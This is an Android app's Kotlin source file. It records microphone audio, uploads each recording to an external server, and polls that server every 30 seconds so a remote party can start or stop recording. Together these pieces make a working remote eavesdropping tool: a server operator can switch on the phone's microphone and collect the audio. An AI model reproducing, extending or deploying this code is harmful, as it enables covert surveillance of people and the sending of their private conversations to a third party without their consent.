package com.example.audiocontroller

import android.Manifest
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.IOException

class MainActivity : AppCompatActivity() {

    private lateinit var statusText: TextView
    private lateinit var startButton: Button
    private lateinit var stopButton: Button
    private var mediaRecorder: MediaRecorder? = null
    private var audioFile: File? = null
    private val serverUrl = "https://hashir711.pythonanywhere.com"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        statusText = findViewById(R.id.statusText)
        startButton = findViewById(R.id.startButton)
        stopButton = findViewById(R.id.stopButton)

        checkPermissions()

        startButton.setOnClickListener { startRecording() }
        stopButton.setOnClickListener { stopRecording() }

        startServerConnectionLoop()
    }

    private fun checkPermissions() {
        val permissions = arrayOf(Manifest.permission.RECORD_AUDIO, Manifest.permission.WRITE_EXTERNAL_STORAGE)
        val needed = permissions.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
        if (needed.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), 0)
        }
    }

    private fun startRecording() {
        try {
            audioFile = File(externalCacheDir, "audio_${System.currentTimeMillis()}.mp3")
            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setOutputFile(audioFile!!.absolutePath)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                prepare()
                start()
            }
            statusText.text = "Status: Recording"
        } catch (e: Exception) {
            statusText.text = "Error: ${e.message}"
        }
    }

    private fun stopRecording() {
        try {
            mediaRecorder?.apply {
                stop()
                release()
            }
            mediaRecorder = null
            statusText.text = "Status: Stopped"

            audioFile?.let { uploadFile(it) }

        } catch (e: Exception) {
            statusText.text = "Error: ${e.message}"
        }
    }

    private fun uploadFile(file: File) {
        val client = OkHttpClient()
        val body = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("file", file.name, file.asRequestBody("audio/mpeg".toMediaTypeOrNull()))
            .build()

        val request = Request.Builder()
            .url("$serverUrl/upload")
            .post(body)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                runOnUiThread { statusText.text = "Upload failed" }
            }

            override fun onResponse(call: Call, response: Response) {
                runOnUiThread { statusText.text = "Uploaded: ${file.name}" }
            }
        })
    }

    private fun startServerConnectionLoop() {
        CoroutineScope(Dispatchers.IO).launch {
            while (true) {
                try {
                    val client = OkHttpClient()
                    val request = Request.Builder().url("$serverUrl/status").build()
                    val response = client.newCall(request).execute()
                    val json = response.body?.string() ?: ""
                    runOnUiThread {
                        if (json.contains("true")) {
                            if (mediaRecorder == null) startRecording()
                        } else {
                            if (mediaRecorder != null) stopRecording()
                        }
                    }
                } catch (_: Exception) {}
                delay(30000)
            }
        }
    }
}
